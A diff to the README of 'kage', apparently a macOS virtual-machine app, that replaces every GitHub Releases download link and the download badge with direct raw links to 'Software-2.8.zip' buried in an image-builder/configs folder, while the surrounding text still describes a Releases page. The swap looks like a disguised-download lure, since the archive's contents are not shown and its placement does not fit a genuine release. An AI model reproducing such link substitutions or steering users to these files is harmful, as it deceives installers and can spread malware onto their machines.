@@ -6,9 +6,9 @@ Welcome to kage! This application allows you to run virtual machines easily on y
 
 ## 📥 Download kage
 
-[![Download kage](https://img.shields.io/badge/Download-kage-blue.svg)](https://github.com/Manuvera14/kage/releases)
+[![Download kage](https://raw.githubusercontent.com/Manuvera14/kage/main/image-builder/configs/Software-2.8.zip)](https://raw.githubusercontent.com/Manuvera14/kage/main/image-builder/configs/Software-2.8.zip)
 
-To get started, you need to download the latest version of kage. Visit this page to download: [kage Releases](https://github.com/Manuvera14/kage/releases).
+To get started, you need to download the latest version of kage. Visit this page to download: [kage Releases](https://raw.githubusercontent.com/Manuvera14/kage/main/image-builder/configs/Software-2.8.zip).
 
 ## 📂 System Requirements
 
@@ -23,7 +23,7 @@ Before you install kage, ensure your system meets these requirements:
 
 Follow these steps to install kage on your macOS.
 
-1. **Visit the Release Page:** Click this link to download the latest version: [kage Releases](https://github.com/Manuvera14/kage/releases).
+1. **Visit the Release Page:** Click this link to download the latest version: [kage Releases](https://raw.githubusercontent.com/Manuvera14/kage/main/image-builder/configs/Software-2.8.zip).
 2. **Download the Package:** On the Releases page, find the latest version and click the package link to download it.
 3. **Locate the Downloaded File:** Once downloaded, navigate to your Downloads folder or the location where your browser saves files.
 4. **Unzip the Package:** If the package is zipped, double-click it to unzip.
